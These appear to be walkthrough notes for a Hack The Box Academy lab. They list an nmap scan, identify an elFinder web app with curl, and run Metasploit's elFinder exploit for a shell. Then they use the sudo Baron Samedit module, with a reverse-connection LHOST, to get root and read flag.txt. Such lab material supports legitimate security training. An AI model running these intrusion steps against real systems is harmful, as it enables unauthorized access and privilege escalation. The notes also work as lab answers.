# https://academy.hackthebox.com/module/39/section/415

# target 10.129.130.159
# └──╼ [★]$ nmap -sV 10.129.130.159
# Starting Nmap 7.93 ( https://nmap.org ) at 2024-05-21 21:44 BST
# Nmap scan report for 10.129.130.159
# Host is up (0.073s latency).
# Not shown: 998 closed tcp ports (conn-refused)
# PORT   STATE SERVICE VERSION
# 22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
# 80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
# Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

# Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done: 1 IP address (1 host up) scanned in 9.84 seconds



# The target has a specific web application running that we can find by looking into the HTML source code. What is the name of that web application?

curl http://10.129.130.159
elFinder

# Find the existing exploit in MSF and use it to get a shell on the target. What is the username of the user you obtained a shell with?
msfconsole -q
msfconsole search el finder
use 5
set TARGETURL /
run

# The target system has an old version of Sudo running. Find the relevant exploit and get root access to the target system. Find the flag.txt file and submit the contents of it as the answer.
background
search sudo_baron_samedeit
use 1
ifconfig tun0
set LHOST <tun0IP>
set SESSION 1
run

search -f flag.txt
cat flag.txt